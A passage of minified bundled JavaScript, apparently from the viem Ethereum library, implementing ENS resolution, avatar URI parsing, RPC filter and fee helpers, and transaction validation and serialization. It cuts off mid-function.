T=(0,r.observe)(v,{resolve:O,reject:_},B=>{const U=(0,i.poll)(async()=>{const M=N=>{clearTimeout(I),U(),N(),T()};try{const N=await(0,o.withRetry)(async()=>{const q=await(0,n.getAction)(h,c.getCallsStatus,"getCallsStatus")({id:b});if(S&&q.status==="failure")throw new e.BundleFailedError(q);return q},{retryCount:E,delay:A});if(!y(N))return;M(()=>B.resolve(N))}catch(N){M(()=>B.reject(N))}},{interval:w,emitOnBegin:!0});return U});return I=R?setTimeout(()=>{T(),clearTimeout(I),_(new f({id:b}))},R):void 0,await k}class f extends t.BaseError{constructor({id:m}){super(`Timed out while waiting for call bundle with id "${m}" to be confirmed.`,{name:"WaitForCallsStatusTimeoutError"})}}return Sb.WaitForCallsStatusTimeoutError=f,Sb}var N2={},qC={},sJ;function Dle(){if(sJ)return qC;sJ=1,Object.defineProperty(qC,"__esModule",{value:!0}),qC.uid=r;const t=256;let e=t,n;function r(i=11){if(!n||e+i>t*2){n="",e=0;for(let s=0;s<t;s++)n+=(256+Math.random()*256|0).toString(16).substring(1)}return n.substring(e,e+++i)}return qC}var oJ;function nR(){if(oJ)return N2;oJ=1,Object.defineProperty(N2,"__esModule",{value:!0}),N2.createClient=n,N2.rpcSchema=r;const t=Qr(),e=Dle();function n(i){const{batch:s,chain:o,ccipRead:a,key:c="base",name:l="Base Client",type:f="base"}=i,h=i.experimental_blockTag??(typeof o?.experimental_preconfirmationTime=="number"?"pending":void 0),m=o?.blockTime??12e3,b=Math.min(Math.max(Math.floor(m/2),500),4e3),w=i.pollingInterval??b,y=i.cacheTime??w,E=i.account?(0,t.parseAccount)(i.account):void 0,{config:A,request:R,value:S}=i.transport({account:E,chain:o,pollingInterval:w}),v={...A,...S},k={account:E,batch:s,cacheTime:y,ccipRead:a,chain:o,key:c,name:l,pollingInterval:w,request:R,transport:v,type:f,uid:(0,e.uid)(),...h?{experimental_blockTag:h}:{}};function O(_){return I=>{const T=I(_);for(const U in k)delete T[U];const B={..._,...T};return Object.assign(B,{extend:O(B)})}}return Object.assign(k,{extend:O(k)})}function r(){return null}return N2}var VC={},WC={},GC={},KC={},aJ;function hM(){if(aJ)return KC;aJ=1,Object.defineProperty(KC,"__esModule",{value:!0}),KC.isNullUniversalResolverError=n;const t=Kt(),e=o0();function n(r){if(!(r instanceof t.BaseError))return!1;const i=r.walk(s=>s instanceof e.ContractFunctionRevertedError);return i instanceof e.ContractFunctionRevertedError?i.data?.errorName==="HttpError"||i.data?.errorName==="ResolverError"||i.data?.errorName==="ResolverNotContract"||i.data?.errorName==="ResolverNotFound"||i.data?.errorName==="ReverseAddressMismatch"||i.data?.errorName==="UnsupportedResolverProfile":!1}return KC}var ZC={},YC={},cJ;function Ble(){if(cJ)return YC;cJ=1,Object.defineProperty(YC,"__esModule",{value:!0}),YC.encodedLabelToLabelhash=e;const t=So();function e(n){if(n.length!==66||n.indexOf("[")!==0||n.indexOf("]")!==65)return null;const r=`0x${n.slice(1,65)}`;return(0,t.isHex)(r)?r:null}return YC}var uJ;function pM(){if(uJ)return ZC;uJ=1,Object.defineProperty(ZC,"__esModule",{value:!0}),ZC.namehash=s;const t=os(),e=yr(),n=lt(),r=ha(),i=Ble();function s(o){let a=new Uint8Array(32).fill(0);if(!o)return(0,n.bytesToHex)(a);const c=o.split(".");for(let l=c.length-1;l>=0;l-=1){const f=(0,i.encodedLabelToLabelhash)(c[l]),h=f?(0,e.toBytes)(f):(0,r.keccak256)((0,e.stringToBytes)(c[l]),"bytes");a=(0,r.keccak256)((0,t.concat)([a,h]),"bytes")}return(0,n.bytesToHex)(a)}return ZC}var QC={},JC={},lJ;function GFe(){if(lJ)return JC;lJ=1,Object.defineProperty(JC,"__esModule",{value:!0}),JC.encodeLabelhash=t;function t(e){return`[${e.slice(2)}]`}return JC}var XC={},dJ;function jle(){if(dJ)return XC;dJ=1,Object.defineProperty(XC,"__esModule",{value:!0}),XC.labelhash=i;const t=yr(),e=lt(),n=ha(),r=Ble();function i(s){const o=new Uint8Array(32).fill(0);return s?(0,r.encodedLabelToLabelhash)(s)||(0,n.keccak256)((0,t.stringToBytes)(s)):(0,e.bytesToHex)(o)}return XC}var fJ;function mM(){if(fJ)return QC;fJ=1,Object.defineProperty(QC,"__esModule",{value:!0}),QC.packetToBytes=r;const t=yr(),e=GFe(),n=jle();function r(i){const s=i.replace(/^\.|\.$/gm,"");if(s.length===0)return new Uint8Array(1);const o=new Uint8Array((0,t.stringToBytes)(s).byteLength+2);let a=0;const c=s.split(".");for(let l=0;l<c.length;l++){let f=(0,t.stringToBytes)(c[l]);f.byteLength>255&&(f=(0,t.stringToBytes)((0,e.encodeLabelhash)((0,n.labelhash)(c[l])))),o[a]=f.length,o.set(f,a+1),a+=f.length+1}return o.byteLength!==a+1?o.slice(0,a+1):o}return QC}var hJ;function KFe(){if(hJ)return GC;hJ=1,Object.defineProperty(GC,"__esModule",{value:!0}),GC.getEnsAddress=m;const t=f0(),e=eh(),n=ma(),r=h0(),i=Yf(),s=lt(),o=hM(),a=Q8(),c=pM(),l=mM(),f=Pn(),h=ld();async function m(b,w){const{blockNumber:y,blockTag:E,coinType:A,name:R,gatewayUrls:S,strict:v}=w,{chain:k}=b,O=(()=>{if(w.universalResolverAddress)return w.universalResolverAddress;if(!k)throw new Error("client chain not configured. universalResolverAddress is required.");return(0,r.getChainContractAddress)({blockNumber:y,chain:k,contract:"ensUniversalResolver"})})(),_=k?.ensTlds;if(_&&!_.some(T=>R.endsWith(T)))return null;const I=A!=null?[(0,c.namehash)(R),BigInt(A)]:[(0,c.namehash)(R)];try{const T=(0,n.encodeFunctionData)({abi:t.addressResolverAbi,functionName:"addr",args:I}),B={address:O,abi:t.universalResolverResolveAbi,functionName:"resolveWithGateways",args:[(0,s.toHex)((0,l.packetToBytes)(R)),T,S??[a.localBatchGatewayUrl]],blockNumber:y,blockTag:E},M=await(0,f.getAction)(b,h.readContract,"readContract")(B);if(M[0]==="0x")return null;const N=(0,e.decodeFunctionResult)({abi:t.addressResolverAbi,args:I,functionName:"addr",data:M[0]});return N==="0x"||(0,i.trim)(N)==="0x00"?null:N}catch(T){if(v)throw T;if((0,o.isNullUniversalResolverError)(T))return null;throw T}}return GC}var eS={},tS={},wu={},Ma={},pJ;function gM(){if(pJ)return Ma;pJ=1,Object.defineProperty(Ma,"__esModule",{value:!0}),Ma.EnsInvalidChainIdError=Ma.EnsAvatarUnsupportedNamespaceError=Ma.EnsAvatarUriResolutionError=Ma.EnsAvatarInvalidNftUriError=Ma.EnsAvatarInvalidMetadataError=void 0;const t=Kt();class e extends t.BaseError{constructor({data:a}){super("Unable to extract image from metadata. The metadata may be malformed or invalid.",{metaMessages:["- Metadata must be a JSON object with at least an `image`, `image_url` or `image_data` property.","",`Provided data: ${JSON.stringify(a)}`],name:"EnsAvatarInvalidMetadataError"})}}Ma.EnsAvatarInvalidMetadataError=e;class n extends t.BaseError{constructor({reason:a}){super(`ENS NFT avatar URI is invalid. ${a}`,{name:"EnsAvatarInvalidNftUriError"})}}Ma.EnsAvatarInvalidNftUriError=n;class r extends t.BaseError{constructor({uri:a}){super(`Unable to resolve ENS avatar URI "${a}". The URI may be malformed, invalid, or does not respond with a valid image.`,{name:"EnsAvatarUriResolutionError"})}}Ma.EnsAvatarUriResolutionError=r;class i extends t.BaseError{constructor({namespace:a}){super(`ENS NFT avatar namespace "${a}" is not supported. Must be "erc721" or "erc1155".`,{name:"EnsAvatarUnsupportedNamespaceError"})}}Ma.EnsAvatarUnsupportedNamespaceError=i;class s extends t.BaseError{constructor({chainId:a}){super(`Invalid ENSIP-11 chainId: ${a}. Must be between 0 and 0x7fffffff, or 1.`,{name:"EnsInvalidChainIdError"})}}return Ma.EnsInvalidChainIdError=s,Ma}var mJ;function ZFe(){if(mJ)return wu;mJ=1,Object.defineProperty(wu,"__esModule",{value:!0}),wu.isImageUri=o,wu.getGateway=a,wu.resolveAvatarUri=c,wu.getJsonImage=l,wu.getMetadataAvatarUri=f,wu.parseAvatarUri=h,wu.parseNftUri=m,wu.getNftTokenUri=b;const t=ld(),e=gM(),n=/(?<protocol>https?:\/\/[^/]*|ipfs:\/|ipns:\/|ar:\/)?(?<root>\/)?(?<subpath>ipfs\/|ipns\/)?(?<target>[\w\-.]+)(?<subtarget>\/.*)?/,r=/^(Qm[1-9A-HJ-NP-Za-km-z]{44,}|b[A-Za-z2-7]{58,}|B[A-Z2-7]{58,}|z[1-9A-HJ-NP-Za-km-z]{48,}|F[0-9A-F]{50,})(\/(?<target>[\w\-.]+))?(?<subtarget>\/.*)?$/,i=/^data:([a-zA-Z\-/+]*);base64,([^"].*)/,s=/^data:([a-zA-Z\-/+]*)?(;[a-zA-Z0-9].*?)?(,)/;async function o(w){try{const y=await fetch(w,{method:"HEAD"});return y.status===200?y.headers.get("content-type")?.startsWith("image/"):!1}catch(y){return typeof y=="object"&&typeof y.response<"u"||!Object.hasOwn(globalThis,"Image")?!1:new Promise(E=>{const A=new Image;A.onload=()=>{E(!0)},A.onerror=()=>{E(!1)},A.src=w})}}function a(w,y){return w?w.endsWith("/")?w.slice(0,-1):w:y}function c({uri:w,gatewayUrls:y}){const E=i.test(w);if(E)return{uri:w,isOnChain:!0,isEncoded:E};const A=a(y?.ipfs,"https://ipfs.io"),R=a(y?.arweave,"https://arweave.net"),S=w.match(n),{protocol:v,subpath:k,target:O,subtarget:_=""}=S?.groups||{},I=v==="ipns:/"||k==="ipns/",T=v==="ipfs:/"||k==="ipfs/"||r.test(w);if(w.startsWith("http")&&!I&&!T){let U=w;return y?.arweave&&(U=w.replace(/https:\/\/arweave.net/g,y?.arweave)),{uri:U,isOnChain:!1,isEncoded:!1}}if((I||T)&&O)return{uri:`${A}/${I?"ipns":"ipfs"}/${O}${_}`,isOnChain:!1,isEncoded:!1};if(v==="ar:/"&&O)return{uri:`${R}/${O}${_||""}`,isOnChain:!1,isEncoded:!1};let B=w.replace(s,"");if(B.startsWith("<svg")&&(B=`data:image/svg+xml;base64,${btoa(B)}`),B.startsWith("data:")||B.startsWith("{"))return{uri:B,isOnChain:!0,isEncoded:!1};throw new e.EnsAvatarUriResolutionError({uri:w})}function l(w){if(typeof w!="object"||!("image"in w)&&!("image_url"in w)&&!("image_data"in w))throw new e.EnsAvatarInvalidMetadataError({data:w});return w.image||w.image_url||w.image_data}async function f({gatewayUrls:w,uri:y}){try{const E=await fetch(y).then(R=>R.json());return await h({gatewayUrls:w,uri:l(E)})}catch{throw new e.EnsAvatarUriResolutionError({uri:y})}}async function h({gatewayUrls:w,uri:y}){const{uri:E,isOnChain:A}=c({uri:y,gatewayUrls:w});if(A||await o(E))return E;throw new e.EnsAvatarUriResolutionError({uri:y})}function m(w){let y=w;y.startsWith("did:nft:")&&(y=y.replace("did:nft:","").replace(/_/g,"/"));const[E,A,R]=y.split("/"),[S,v]=E.split(":"),[k,O]=A.split(":");if(!S||S.toLowerCase()!=="eip155")throw new e.EnsAvatarInvalidNftUriError({reason:"Only EIP-155 supported"});if(!v)throw new e.EnsAvatarInvalidNftUriError({reason:"Chain ID not found"});if(!O)throw new e.EnsAvatarInvalidNftUriError({reason:"Contract address not found"});if(!R)throw new e.EnsAvatarInvalidNftUriError({reason:"Token ID not found"});if(!k)throw new e.EnsAvatarInvalidNftUriError({reason:"ERC namespace not found"});return{chainID:Number.parseInt(v,10),namespace:k.toLowerCase(),contractAddress:O,tokenID:R}}async function b(w,{nft:y}){if(y.namespace==="erc721")return(0,t.readContract)(w,{address:y.contractAddress,abi:[{name:"tokenURI",type:"function",stateMutability:"view",inputs:[{name:"tokenId",type:"uint256"}],outputs:[{name:"",type:"string"}]}],functionName:"tokenURI",args:[BigInt(y.tokenID)]});if(y.namespace==="erc1155")return(0,t.readContract)(w,{address:y.contractAddress,abi:[{name:"uri",type:"function",stateMutability:"view",inputs:[{name:"_id",type:"uint256"}],outputs:[{name:"",type:"string"}]}],functionName:"uri",args:[BigInt(y.tokenID)]});throw new e.EnsAvatarUnsupportedNamespaceError({namespace:y.namespace})}return wu}var gJ;function YFe(){if(gJ)return tS;gJ=1,Object.defineProperty(tS,"__esModule",{value:!0}),tS.parseAvatarRecord=e;const t=ZFe();async function e(r,{gatewayUrls:i,record:s}){return/eip155:/i.test(s)?n(r,{gatewayUrls:i,record:s}):(0,t.parseAvatarUri)({uri:s,gatewayUrls:i})}async function n(r,{gatewayUrls:i,record:s}){const o=(0,t.parseNftUri)(s),a=await(0,t.getNftTokenUri)(r,{nft:o}),{uri:c,isOnChain:l,isEncoded:f}=(0,t.resolveAvatarUri)({uri:a,gatewayUrls:i});if(l&&(c.includes("data:application/json;base64,")||c.startsWith("{"))){const m=f?atob(c.replace("data:application/json;base64,","")):c,b=JSON.parse(m);return(0,t.parseAvatarUri)({uri:(0,t.getJsonImage)(b),gatewayUrls:i})}let h=o.tokenID;return o.namespace==="erc1155"&&(h=h.replace("0x","").padStart(64,"0")),(0,t.getMetadataAvatarUri)({gatewayUrls:i,uri:c.replace(/(?:0x)?{id}/,h)})}return tS}var nS={},yJ;function Mle(){if(yJ)return nS;yJ=1,Object.defineProperty(nS,"__esModule",{value:!0}),nS.getEnsText=h;const t=f0(),e=eh(),n=ma(),r=h0(),i=lt(),s=hM(),o=Q8(),a=pM(),c=mM(),l=Pn(),f=ld();async function h(m,b){const{blockNumber:w,blockTag:y,key:E,name:A,gatewayUrls:R,strict:S}=b,{chain:v}=m,k=(()=>{if(b.universalResolverAddress)return b.universalResolverAddress;if(!v)throw new Error("client chain not configured. universalResolverAddress is required.");return(0,r.getChainContractAddress)({blockNumber:w,chain:v,contract:"ensUniversalResolver"})})(),O=v?.ensTlds;if(O&&!O.some(_=>A.endsWith(_)))return null;try{const _={address:k,abi:t.universalResolverResolveAbi,args:[(0,i.toHex)((0,c.packetToBytes)(A)),(0,n.encodeFunctionData)({abi:t.textResolverAbi,functionName:"text",args:[(0,a.namehash)(A),E]}),R??[o.localBatchGatewayUrl]],functionName:"resolveWithGateways",blockNumber:w,blockTag:y},T=await(0,l.getAction)(m,f.readContract,"readContract")(_);if(T[0]==="0x")return null;const B=(0,e.decodeFunctionResult)({abi:t.textResolverAbi,functionName:"text",data:T[0]});return B===""?null:B}catch(_){if(S)throw _;if((0,s.isNullUniversalResolverError)(_))return null;throw _}}return nS}var bJ;function QFe(){if(bJ)return eS;bJ=1,Object.defineProperty(eS,"__esModule",{value:!0}),eS.getEnsAvatar=r;const t=YFe(),e=Pn(),n=Mle();async function r(i,{blockNumber:s,blockTag:o,assetGatewayUrls:a,name:c,gatewayUrls:l,strict:f,universalResolverAddress:h}){const m=await(0,e.getAction)(i,n.getEnsText,"getEnsText")({blockNumber:s,blockTag:o,key:"avatar",name:c,universalResolverAddress:h,gatewayUrls:l,strict:f});if(!m)return null;try{return await(0,t.parseAvatarRecord)(i,{record:m,gatewayUrls:a})}catch{return null}}return eS}var rS={},wJ;function JFe(){if(wJ)return rS;wJ=1,Object.defineProperty(rS,"__esModule",{value:!0}),rS.getEnsName=o;const t=f0(),e=h0(),n=hM(),r=Q8(),i=Pn(),s=ld();async function o(a,c){const{address:l,blockNumber:f,blockTag:h,coinType:m=60n,gatewayUrls:b,strict:w}=c,{chain:y}=a,E=(()=>{if(c.universalResolverAddress)return c.universalResolverAddress;if(!y)throw new Error("client chain not configured. universalResolverAddress is required.");return(0,e.getChainContractAddress)({blockNumber:f,chain:y,contract:"ensUniversalResolver"})})();try{const A={address:E,abi:t.universalResolverReverseAbi,args:[l,m,b??[r.localBatchGatewayUrl]],functionName:"reverseWithGateways",blockNumber:f,blockTag:h},R=(0,i.getAction)(a,s.readContract,"readContract"),[S]=await R(A);return S||null}catch(A){if(w)throw A;if((0,n.isNullUniversalResolverError)(A))return null;throw A}}return rS}var iS={},vJ;function XFe(){if(vJ)return iS;vJ=1,Object.defineProperty(iS,"__esModule",{value:!0}),iS.getEnsResolver=s;const t=h0(),e=lt(),n=mM(),r=Pn(),i=ld();async function s(o,a){const{blockNumber:c,blockTag:l,name:f}=a,{chain:h}=o,m=(()=>{if(a.universalResolverAddress)return a.universalResolverAddress;if(!h)throw new Error("client chain not configured. universalResolverAddress is required.");return(0,t.getChainContractAddress)({blockNumber:c,chain:h,contract:"ensUniversalResolver"})})(),b=h?.ensTlds;if(b&&!b.some(y=>f.endsWith(y)))throw new Error(`${f} is not a valid ENS TLD (${b?.join(", ")}) for chain "${h.name}" (id: ${h.id}).`);const[w]=await(0,r.getAction)(o,i.readContract,"readContract")({address:m,abi:[{inputs:[{type:"bytes"}],name:"findResolver",outputs:[{type:"address"},{type:"bytes32"},{type:"uint256"}],stateMutability:"view",type:"function"}],functionName:"findResolver",args:[(0,e.toHex)((0,n.packetToBytes)(f))],blockNumber:c,blockTag:l});return w}return iS}var sS={},EJ;function Ule(){if(EJ)return sS;EJ=1,Object.defineProperty(sS,"__esModule",{value:!0}),sS.createAccessList=o;const t=Qr(),e=lt(),n=tM(),r=l0(),i=Yu(),s=Qu();async function o(a,c){const{account:l=a.account,blockNumber:f,blockTag:h="latest",blobs:m,data:b,gas:w,gasPrice:y,maxFeePerBlobGas:E,maxFeePerGas:A,maxPriorityFeePerGas:R,to:S,value:v,...k}=c,O=l?(0,t.parseAccount)(l):void 0;try{(0,s.assertRequest)(c);const I=(typeof f=="bigint"?(0,e.numberToHex)(f):void 0)||h,T=a.chain?.formatters?.transactionRequest?.format,U=(T||i.formatTransactionRequest)({...(0,r.extract)(k,{format:T}),account:O,blobs:m,data:b,gas:w,gasPrice:y,maxFeePerBlobGas:E,maxFeePerGas:A,maxPriorityFeePerGas:R,to:S,value:v},"createAccessList"),M=await a.request({method:"eth_createAccessList",params:[U,I]});return{accessList:M.accessList,gasUsed:BigInt(M.gasUsed)}}catch(_){throw(0,n.getCallError)(_,{...c,account:O,chain:a.chain})}}return sS}var oS={},_J;function e$e(){if(_J)return oS;_J=1,Object.defineProperty(oS,"__esModule",{value:!0}),oS.createBlockFilter=e;const t=F8();async function e(n){const r=(0,t.createFilterRequestScope)(n,{method:"eth_newBlockFilter"}),i=await n.request({method:"eth_newBlockFilter"});return{id:i,request:r(i),type:"block"}}return oS}var aS={},AJ;function Lle(){if(AJ)return aS;AJ=1,Object.defineProperty(aS,"__esModule",{value:!0}),aS.createEventFilter=r;const t=oy(),e=lt(),n=F8();async function r(i,{address:s,args:o,event:a,events:c,fromBlock:l,strict:f,toBlock:h}={}){const m=c??(a?[a]:void 0),b=(0,n.createFilterRequestScope)(i,{method:"eth_newFilter"});let w=[];m&&(w=[m.flatMap(A=>(0,t.encodeEventTopics)({abi:[A],eventName:A.name,args:o}))],a&&(w=w[0]));const y=await i.request({method:"eth_newFilter",params:[{address:s,fromBlock:typeof l=="bigint"?(0,e.numberToHex)(l):l,toBlock:typeof h=="bigint"?(0,e.numberToHex)(h):h,...w.length?{topics:w}:{}}]});return{abi:m,args:o,eventName:a?a.name:void 0,fromBlock:l,id:y,request:b(y),strict:!!f,toBlock:h,type:"event"}}return aS}var cS={},CJ;function Fle(){if(CJ)return cS;CJ=1,Object.defineProperty(cS,"__esModule",{value:!0}),cS.createPendingTransactionFilter=e;const t=F8();async function e(n){const r=(0,t.createFilterRequestScope)(n,{method:"eth_newPendingTransactionFilter"}),i=await n.request({method:"eth_newPendingTransactionFilter"});return{id:i,request:r(i),type:"transaction"}}return cS}var uS={},SJ;function t$e(){if(SJ)return uS;SJ=1,Object.defineProperty(uS,"__esModule",{value:!0}),uS.getBalance=e;const t=lt();async function e(n,{address:r,blockNumber:i,blockTag:s=n.experimental_blockTag??"latest"}){const o=typeof i=="bigint"?(0,t.numberToHex)(i):void 0,a=await n.request({method:"eth_getBalance",params:[r,o||s]});return BigInt(a)}return uS}var lS={},TJ;function n$e(){if(TJ)return lS;TJ=1,Object.defineProperty(lS,"__esModule",{value:!0}),lS.getBlobBaseFee=t;async function t(e){const n=await e.request({method:"eth_blobBaseFee"});return BigInt(n)}return lS}var dS={},xJ;function r$e(){if(xJ)return dS;xJ=1,Object.defineProperty(dS,"__esModule",{value:!0}),dS.getBlockTransactionCount=n;const t=ci(),e=lt();async function n(r,{blockHash:i,blockNumber:s,blockTag:o="latest"}={}){const a=s!==void 0?(0,e.numberToHex)(s):void 0;let c;return i?c=await r.request({method:"eth_getBlockTransactionCountByHash",params:[i]},{dedupe:!0}):c=await r.request({method:"eth_getBlockTransactionCountByNumber",params:[a||o]},{dedupe:!!a}),(0,t.hexToNumber)(c)}return dS}var fS={},IJ;function $le(){if(IJ)return fS;IJ=1,Object.defineProperty(fS,"__esModule",{value:!0}),fS.getCode=e;const t=lt();async function e(n,{address:r,blockNumber:i,blockTag:s="latest"}){const o=i!==void 0?(0,t.numberToHex)(i):void 0,a=await n.request({method:"eth_getCode",params:[r,o||s]},{dedupe:!!o});if(a!=="0x")return a}return fS}var hS={},O2={},RJ;function i$e(){if(RJ)return O2;RJ=1,Object.defineProperty(O2,"__esModule",{value:!0}),O2.Eip712DomainNotFoundError=void 0;const t=Kt();class e extends t.BaseError{constructor({address:r}){super(`No EIP-712 domain found on contract "${r}".`,{metaMessages:["Ensure that:",`- The contract is deployed at the address "${r}".`,"- `eip712Domain()` function exists on the contract.","- `eip712Domain()` function matches signature to ERC-5267 specification."],name:"Eip712DomainNotFoundError"})}}return O2.Eip712DomainNotFoundError=e,O2}var PJ;function s$e(){if(PJ)return hS;PJ=1,Object.defineProperty(hS,"__esModule",{value:!0}),hS.getEip712Domain=r;const t=i$e(),e=Pn(),n=ld();async function r(s,o){const{address:a,factory:c,factoryData:l}=o;try{const[f,h,m,b,w,y,E]=await(0,e.getAction)(s,n.readContract,"readContract")({abi:i,address:a,functionName:"eip712Domain",factory:c,factoryData:l});return{domain:{name:h,version:m,chainId:Number(b),verifyingContract:w,salt:y},extensions:E,fields:f}}catch(f){const h=f;throw h.name==="ContractFunctionExecutionError"&&h.cause.name==="ContractFunctionZeroDataError"?new t.Eip712DomainNotFoundError({address:a}):h}}const i=[{inputs:[],name:"eip712Domain",outputs:[{name:"fields",type:"bytes1"},{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"},{name:"salt",type:"bytes32"},{name:"extensions",type:"uint256[]"}],stateMutability:"view",type:"function"}];return hS}var pS={},mS={},NJ;function o$e(){if(NJ)return mS;NJ=1,Object.defineProperty(mS,"__esModule",{value:!0}),mS.formatFeeHistory=t;function t(e){return{baseFeePerGas:e.baseFeePerGas.map(n=>BigInt(n)),gasUsedRatio:e.gasUsedRatio,oldestBlock:BigInt(e.oldestBlock),reward:e.reward?.map(n=>n.map(r=>BigInt(r)))}}return mS}var OJ;function a$e(){if(OJ)return pS;OJ=1,Object.defineProperty(pS,"__esModule",{value:!0}),pS.getFeeHistory=n;const t=lt(),e=o$e();async function n(r,{blockCount:i,blockNumber:s,blockTag:o="latest",rewardPercentiles:a}){const c=typeof s=="bigint"?(0,t.numberToHex)(s):void 0,l=await r.request({method:"eth_feeHistory",params:[(0,t.numberToHex)(i),c||o,a]},{dedupe:!!c});return(0,e.formatFeeHistory)(l)}return pS}var gS={},kJ;function c$e(){if(kJ)return gS;kJ=1,Object.defineProperty(gS,"__esModule",{value:!0}),gS.getFilterLogs=n;const t=VA(),e=Xf();async function n(r,{filter:i}){const s=i.strict??!1,a=(await i.request({method:"eth_getFilterLogs",params:[i.id]})).map(c=>(0,e.formatLog)(c));return i.abi?(0,t.parseEventLogs)({abi:i.abi,logs:a,strict:s}):a}return gS}var yS={},bS={},ak={},wS={},DJ;function Hle(){if(DJ)return wS;DJ=1,Object.defineProperty(wS,"__esModule",{value:!0}),wS.encodePacked=a;const t=$r(),e=Gu(),n=pa(),r=os(),i=r0(),s=lt(),o=L8();function a(l,f){if(l.length!==f.length)throw new t.AbiEncodingLengthMismatchError({expectedLength:l.length,givenLength:f.length});const h=[];for(let m=0;m<l.length;m++){const b=l[m],w=f[m];h.push(c(b,w))}return(0,r.concatHex)(h)}function c(l,f,h=!1){if(l==="address"){const y=f;if(!(0,n.isAddress)(y))throw new e.InvalidAddressError({address:y});return(0,i.pad)(y.toLowerCase(),{size:h?32:null})}if(l==="string")return(0,s.stringToHex)(f);if(l==="bytes")return f;if(l==="bool")return(0,i.pad)((0,s.boolToHex)(f),{size:h?32:1});const m=l.match(o.integerRegex);if(m){const[y,E,A="256"]=m,R=Number.parseInt(A,10)/8;return(0,s.numberToHex)(f,{size:h?32:R,signed:E==="int"})}const b=l.match(o.bytesRegex);if(b){const[y,E]=b;if(Number.parseInt(E,10)!==(f.length-2)/2)throw new t.BytesSizeMismatchError({expectedSize:Number.parseInt(E,10),givenSize:(f.length-2)/2});return(0,i.pad)(f,{dir:"right",size:h?32:null})}const w=l.match(o.arrayRegex);if(w&&Array.isArray(f)){const[y,E]=w,A=[];for(let R=0;R<f.length;R++)A.push(c(E,f[R],!0));return A.length===0?"0x":(0,r.concatHex)(A)}throw new t.UnsupportedPackedAbiType(l)}return wS}var Tb={},vS={},BJ;function yM(){if(BJ)return vS;BJ=1,Object.defineProperty(vS,"__esModule",{value:!0}),vS.isBytes=t;function t(e){return!e||typeof e!="object"||!("BYTES_PER_ELEMENT"in e)?!1:e.BYTES_PER_ELEMENT===1&&e.constructor.name==="Uint8Array"}return vS}var jJ;function zle(){if(jJ)return Tb;jJ=1,Object.defineProperty(Tb,"__esModule",{value:!0}),Tb.getContractAddress=c,Tb.getCreateAddress=l,Tb.getCreate2Address=f;const t=os(),e=yM(),n=r0(),r=Jc(),i=yr(),s=MA(),o=ha(),a=nc();function c(h){return h.opcode==="CREATE2"?f(h):l(h)}function l(h){const m=(0,i.toBytes)((0,a.getAddress)(h.from));let b=(0,i.toBytes)(h.nonce);return b[0]===0&&(b=new Uint8Array([])),(0,a.getAddress)(`0x${(0,o.keccak256)((0,s.toRlp)([m,b],"bytes")).slice(26)}`)}function f(h){const m=(0,i.toBytes)((0,a.getAddress)(h.from)),b=(0,n.pad)((0,e.isBytes)(h.salt)?h.salt:(0,i.toBytes)(h.salt),{size:32}),w="bytecodeHash"in h?(0,e.isBytes)(h.bytecodeHash)?h.bytecodeHash:(0,i.toBytes)(h.bytecodeHash):(0,o.keccak256)(h.bytecode,"bytes");return(0,a.getAddress)((0,r.slice)((0,o.keccak256)((0,t.concat)([(0,i.toBytes)("0xff"),m,b,w])),12))}return Tb}var ES={},k2={},ip={},MJ;function rR(){if(MJ)return ip;MJ=1,Object.defineProperty(ip,"__esModule",{value:!0}),ip.assertTransactionEIP7702=h,ip.assertTransactionEIP4844=m,ip.assertTransactionEIP1559=b,ip.assertTransactionEIP2930=w,ip.assertTransactionLegacy=y;const t=_le(),e=Vj(),n=Gu(),r=Kt(),i=Ale(),s=GA(),o=Jf(),a=pa(),c=fa(),l=Jc(),f=ci();function h(E){const{authorizationList:A}=E;if(A)for(const R of A){const{chainId:S}=R,v=R.address;if(!(0,a.isAddress)(v))throw new n.InvalidAddressError({address:v});if(S<0)throw new s.InvalidChainIdError({chainId:S})}b(E)}function m(E){const{blobVersionedHashes:A}=E;if(A){if(A.length===0)throw new i.EmptyBlobError;for(const R of A){const S=(0,c.size)(R),v=(0,f.hexToNumber)((0,l.slice)(R,0,1));if(S!==32)throw new i.InvalidVersionedHashSizeError({hash:R,size:S});if(v!==t.versionedHashVersionKzg)throw new i.InvalidVersionedHashVersionError({hash:R,version:v})}}b(E)}function b(E){const{chainId:A,maxPriorityFeePerGas:R,maxFeePerGas:S,to:v}=E;if(A<=0)throw new s.InvalidChainIdError({chainId:A});if(v&&!(0,a.isAddress)(v))throw new n.InvalidAddressError({address:v});if(S&&S>e.maxUint256)throw new o.FeeCapTooHighError({maxFeePerGas:S});if(R&&S&&R>S)throw new o.TipAboveFeeCapError({maxFeePerGas:S,maxPriorityFeePerGas:R})}function w(E){const{chainId:A,maxPriorityFeePerGas:R,gasPrice:S,maxFeePerGas:v,to:k}=E;if(A<=0)throw new s.InvalidChainIdError({chainId:A});if(k&&!(0,a.isAddress)(k))throw new n.InvalidAddressError({address:k});if(R||v)throw new r.BaseError("`maxFeePerGas`/`maxPriorityFeePerGas` is not a valid EIP-2930 Transaction attribute.");if(S&&S>e.maxUint256)throw new o.FeeCapTooHighError({maxFeePerGas:S})}function y(E){const{chainId:A,maxPriorityFeePerGas:R,gasPrice:S,maxFeePerGas:v,to:k}=E;if(k&&!(0,a.isAddress)(k))throw new n.InvalidAddressError({address:k});if(typeof A<"u"&&A<=0)throw new s.InvalidChainIdError({chainId:A});if(R||v)throw new r.BaseError("`maxFeePerGas`/`maxPriorityFeePerGas` is not a valid Legacy Transaction attribute.");if(S&&S>e.maxUint256)throw new o.FeeCapTooHighError({maxFeePerGas:S})}return ip}var _S={},UJ;function bM(){if(UJ)return _S;UJ=1,Object.defineProperty(_S,"__esModule",{value:!0}),_S.serializeAccessList=r;const t=Gu(),e=ga(),n=pa();function r(i){if(!i||i.length===0)return[];const s=[];for(let o=0;o<i.length;o++){const{address:a,storageKeys:c}=i[o];for(let l=0;l<c.length;l++)if(c[l].length-2!==64)throw new e.InvalidStorageKeySizeError({storageKey:c[l]});if(!(0,n.isAddress)(a,{strict:!1}))throw new t.InvalidAddressError({address:a});s.push([a,c])}return s}return _S}var LJ;function iR(){if(LJ)return k2;LJ=1,Object.defineProperty(k2,"__esModule",{value:!0}),k2.serializeTransaction=b,k2.toYParitySignatureArray=S;const t=ga(),e=qle(),n=W8(),r=G8(),i=Yj(),s=K8(),o=os(),a=Yf(),c=lt(),l=MA(),f=rR(),h=Z8(),m=bM();function b(v,k){const O=(0,h.getTransactionType)(v);return 